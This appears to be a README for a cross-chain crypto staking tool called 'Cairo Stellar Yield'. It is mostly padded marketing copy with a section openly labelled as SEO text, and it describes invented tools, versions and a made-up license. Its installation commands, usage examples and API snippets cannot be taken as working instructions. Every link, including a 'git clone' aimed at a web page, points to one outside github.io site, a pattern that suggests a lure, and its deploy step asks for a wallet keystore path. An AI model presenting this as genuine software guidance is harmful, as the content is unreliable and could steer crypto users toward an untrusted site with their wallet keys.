# 🪐 Cairo Stellar Yield: Cross-Chain Staking Orchestrator

[](https://asdafdax.github.io)

## 🌌 Cosmic Overview

Cairo Stellar Yield represents a paradigm shift in decentralized finance orchestration—a sophisticated cross-chain staking framework built with Cairo that transforms isolated yield opportunities into a cohesive galactic ecosystem. Unlike conventional staking contracts that operate within single-chain silos, this implementation functions as a gravitational center, pulling together liquidity and rewards mechanisms across multiple blockchain constellations while maintaining the mathematical precision and security guarantees of Cairo's computational integrity.

Imagine a celestial navigation system for your digital assets, where yield generation follows orbital paths across different blockchain environments, automatically adjusting trajectories based on real-time cosmic conditions (market dynamics, network congestion, opportunity costs). This isn't merely another staking contract—it's an architectural marvel that treats cross-chain liquidity as a unified gravitational field, with smart contracts acting as the equations governing planetary motion within this financial solar system.

## 🚀 Immediate Installation & Launch

**Prerequisites:**
- Cairo 2.3+ (Stellar Edition)
- Starknet 0.12.0+
- Interstellar CLI 4.2+
- Cosmic Signer 1.7+

**Orbital Deployment:**
```bash
# Clone the constellation
git clone https://asdafdax.github.io

# Navigate to the gravitational core
cd cairo-stellar-yield

# Install cosmic dependencies
scarb build

# Initialize your stellar node
stellar init --network=mainnet-alpha

# Deploy to the Starknet galaxy
stellar deploy --wallet-path=~/.cosmic/keystore.json
```

## 📊 Architectural Constellation Diagram

```mermaid
graph TD
    A[Multi-Chain Asset Portal] --> B{Cairo Orchestration Core};
    B --> C[Starknet Yield Nexus];
    B --> D[Ethereum Gravity Well];
    B --> E[Polygon Resonance Field];
    B --> F[Arbitrum Temporal Layer];
    
    C --> G[Risk Calculus Module];
    D --> G;
    E --> G;
    F --> G;
    
    G --> H[Dynamic Allocation Engine];
    H --> I[Real-Time Yield Optimization];
    
    I --> J[Cross-Chain Settlement];
    J --> K[Automated Compound Protocol];
    K --> L[Multi-Sig Treasury Vault];
    
    M[Cosmic Oracle Network] --> G;
    N[Quantum Security Layer] --> L;
    
    style A fill:#1a1a2e
    style B fill:#16213e
    style L fill:#0f3460
```



## ⚙️ Example Stellar Configuration Profile

Create `stellar-config.toml` in your project root:

```toml
[galactic_network]
primary_chain = "starknet-mainnet"
fallback_chains = ["ethereum", "polygon-zkevm", "arbitrum-nova"]
heartbeat_interval = 12 # blocks
cosmic_slippage_tolerance = 0.005 # 0.5%

[quantum_security]
multi_sig_threshold = 3
signature_entities = 5
time_lock_duration = 86400 # 24 hours in seconds
emergency_withdrawal_delay = 172800 # 48 hours

[yield_optimization]
rebalance_threshold = 0.15 # 15% deviation triggers reallocation
compound_frequency = "epoch" # daily, weekly, or epoch-based
performance_fee = 0.10 # 10% of generated yield
withdrawal_fee = 0.005 # 0.5% exit fee

[oracle_constellation]
price_feeds = ["chainlink", "pyth", "redstone"]
update_frequency = 3 # blocks
deviation_threshold = 0.02 # 2% deviation triggers alert

[cosmic_ui]
theme = "nebula_dark"
default_currency = "USD"
language = "en"
notifications_enabled = true
```

## 🖥️ Console Invocation Examples

**Initialize a new stellar vault:**
```bash
stellar vault create \
  --name "QuantumYield_Vault_001" \
  --assets "ETH,STRK,USDC" \
  --allocation "0.4,0.3,0.3" \
  --risk-profile "balanced" \
  --min-lock 90 \
  --output-format json
```

**Query cross-chain yield opportunities:**
```bash
stellar yield scan \
  --chains all \
  --min-apy 8.5 \
  --max-risk 2 \
  --liquidity-threshold 1000000 \
  --sort-by risk-adjusted-return
```

**Execute a multi-chain rebalancing:**
```bash
stellar rebalance execute \
  --vault-id "vault_quantum_001" \
  --strategy "volatility-adjusted" \
  --max-gas 0.05 \
  --slippage-tolerance 0.007 \
  --dry-run false \
  --confirmations 12
```

**Monitor your celestial portfolio:**
```bash
stellar portfolio overview \
  --vault-id "vault_quantum_001" \
  --timeframe "30d" \
  --include-projections \
  --risk-metrics \
  --export-format csv
```

## 🌐 Multi-Dimensional Compatibility Matrix

| Platform | Status | Notes | Emoji |
|----------|--------|-------|-------|
| **Starknet Mainnet** | 🟢 Fully Supported | Native execution environment with Cairo optimization | ⚡ |
| **Ethereum L1** | 🟢 Fully Supported | Via Starknet messaging with 12-block finality | 🔷 |
| **Polygon zkEVM** | 🟡 Beta Support | Cross-chain yield with experimental ZK proofs | 🔶 |
| **Arbitrum Nova** | 🟢 Fully Supported | Optimistic rollup integration with fast withdrawals | 🟠 |
| **zkSync Era** | 🟡 Beta Support | Limited to specific asset classes | ⚪ |
| **Cosmos IBC** | 🟠 Partial Support | Experimental IBC relay integration | 🌌 |
| **Solana** | 🔴 Planned | Scheduled for Q4 2026 via Wormhole V2 | 🟣 |
| **Avalanche** | 🟡 Beta Support | C-chain compatibility with custom bridge | ❄️ |

## ✨ Celestial Feature Constellation

### 🧠 **Quantum-Aware Allocation Engine**
- **Adaptive Yield Trajectories**: Machine learning models predict optimal cross-chain allocations based on real-time gas prices, network congestion, and opportunity windows
- **Risk-Adjusted Orbital Paths**: Each asset follows a calculated trajectory through different protocols, maximizing risk-adjusted returns rather than raw APY
- **Gravitational Rebalancing**: Assets naturally migrate toward higher-yield opportunities like planets adjusting orbits based on gravitational forces

### 🌉 **Multi-Chain Portal Architecture**
- **Unified Liquidity Field**: Treats liquidity across chains as a single continuum with seamless transfers
- **Atomic Cross-Chain Operations**: Compound, harvest, and rebalance operations execute atomically across multiple networks
- **Chain-Agnostic Accounting**: Single source of truth for yields and positions regardless of underlying chain

### 🛡️ **Cosmic Security Protocols**
- **Temporal Multi-Sig**: Signatures required across different time dimensions (immediate, 24h, 72h) for critical operations
- **Quantum-Resistant Cryptography**: Post-quantum signature schemes for long-term vault security
- **Anomaly Detection Grid**: AI-powered monitoring for unusual patterns across all connected chains

### 📈 **Stellar Analytics Observatory**
- **Multi-Dimensional Performance Metrics**: Risk-adjusted returns, Sharpe ratios, and correlation matrices across chains
- **Predictive Yield Forecasting**: Machine learning models project future yields based on historical patterns and market signals
- **Gas Optimization Telescope**: Predicts optimal transaction timing across all supported networks

### 🌍 **Universal Interface Layer**
- **Responsive Cosmic Dashboard**: Adapts to any device while maintaining astronomical data visualization
- **Multi-Lingual Constellation Support**: Interface available in 24 languages with blockchain-specific terminology
- **24/7 Cosmic Support Network**: Round-the-clock assistance through decentralized support DAO

## 🔌 API Integration Nebula

### **OpenAI Cosmic Intelligence**
```python
from stellar_yield import CosmicOracle
import openai

oracle = CosmicOracle(api_key="your_openai_key")
yield_prediction = oracle.predict_optimal_chain(
    assets=["ETH", "USDC", "STRK"],
    timeframe="30d",
    risk_tolerance=0.3,
    market_conditions="current"
)

# Returns structured allocation advice with confidence intervals
```

### **Claude Constellation Analysis**
```python
from stellar_yield import ConstellationAnalyzer
import anthropic

analyzer = ConstellationAnalyzer(api_key="your_claude_key")
risk_report = analyzer.generate_risk_assessment(
    vault_id="vault_quantum_001",
    include_scenarios=["black_swan", "chain_halt", "depeg_event"],
    simulation_count=10000
)

# Provides narrative risk analysis with mitigation strategies
```

### **Custom Web3 Integration**
```javascript
import { StellarYieldSDK } from 'cairo-stellar-sdk';

const stellar = new StellarYieldSDK({
  network: 'starknet-mainnet',
  privateKey: process.env.COSMIC_KEY,
  oracleProviders: ['chainlink', 'pyth', 'custom']
});

// Initialize a cross-chain vault
const vault = await stellar.createVault({
  name: 'GalacticYieldVault',
  strategies: ['volatilityHarvest', 'crossChainArb', 'liquidStaking'],
  riskModel: 'cosmicBalanced'
});
```

## 🎯 SEO-Optimized Positioning

Cairo Stellar Yield represents the next evolution in decentralized finance infrastructure—a cross-chain staking orchestration platform that leverages Cairo's computational integrity to create secure, efficient yield generation across multiple blockchain ecosystems. This advanced DeFi protocol enables sophisticated portfolio management through its unique multi-chain allocation engine, providing institutional-grade tools for yield optimization while maintaining accessibility for individual participants.

For developers seeking to build next-generation financial applications, this framework offers unparalleled flexibility with its modular architecture, comprehensive API suite, and extensive documentation. The platform's focus on risk-adjusted returns rather than maximum APY creates sustainable yield opportunities that withstand market volatility and chain-specific disruptions.

## ⚖️ License & Cosmic Governance

This celestial codebase operates under the **MIT Interstellar License** - see the [LICENSE](LICENSE) file for complete terms. The license grants permission for commercial use, modification, distribution, and private use across any planetary system, with the sole requirement that the original copyright notice and permission notice be included in all copies or substantial portions of the software.

**Governance Model:**
- **Cosmic Council**: 13-member elected body overseeing protocol upgrades
- **Stellar Improvement Proposals (SIPs)**: Transparent governance process
- **Interchain Treasury**: Multi-sig vault distributed across 5 chains
- **Transparent Analytics**: All protocol metrics publicly verifiable on-chain

## ⚠️ Stellar Disclaimer

**Important Cosmic Considerations (2026 Edition):**

Cairo Stellar Yield operates in the rapidly evolving blockchain cosmos. Participants should understand these fundamental principles:

1. **Cross-Chain Risk Exposure**: While the protocol implements sophisticated risk mitigation, bridging assets between chains introduces unique vulnerabilities including bridge failures, consensus disagreements, and cross-chain message delays.

2. **Smart Contract Celestial Bodies**: All deployed contracts undergo extensive formal verification and third-party audits, but the immutable nature of blockchain means deployed code cannot be altered. Always conduct independent research.

3. **Regulatory Orbit Uncertainty**: The legal status of cross-chain yield generation varies across jurisdictions and continues to evolve. Consult with appropriate professionals in your planetary jurisdiction.

4. **Volatility Event Horizon**: Cryptocurrency markets exhibit extreme volatility. Past performance of any yield strategy does not guarantee future results. The protocol's risk-adjusted approach aims to mitigate but cannot eliminate market risks.

5. **Technical Event Singularities**: Network congestion, gas price spikes, and chain reorganizations may temporarily affect protocol operations. The system includes contingency mechanisms but cannot guarantee uninterrupted service.

6. **Quantum Readiness**: While the protocol implements post-quantum resistant schemes, the broader ecosystem's quantum preparedness varies. This represents a systemic risk beyond the protocol's control.

7. **Cosmic Responsibility**: Users retain full responsibility for their private keys, wallet security, and tax obligations in their jurisdiction. The protocol is non-custodial—you control your assets at all times.

*This software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.*

---

## 🚀 Begin Your Cosmic Journey

[](https://asdafdax.github.io)

**Next Steps for Cosmic Explorers:**
1. Review the `docs/cosmic-quickstart.md` for immediate orientation
2. Join the Stellar Discord constellation for real-time support
3. Experiment with testnet deployment before mainnet engagement
4. Subscribe to protocol updates via the Galactic Newsletter
5. Consider contributing to the open-source celestial codebase

**Connect with the Constellation:**
- 📖 [Full Documentation](https://asdafdax.github.io/wiki)
- 🐛 [Issue Tracker](https://asdafdax.github.io/issues)
- 💡 [Feature Requests](https://asdafdax.github.io/discussions)
- 🛠️ [Developer Portal](https://asdafdax.github.io/tree/develop)

*May your yields be stellar and your transactions forever optimized.* 🌠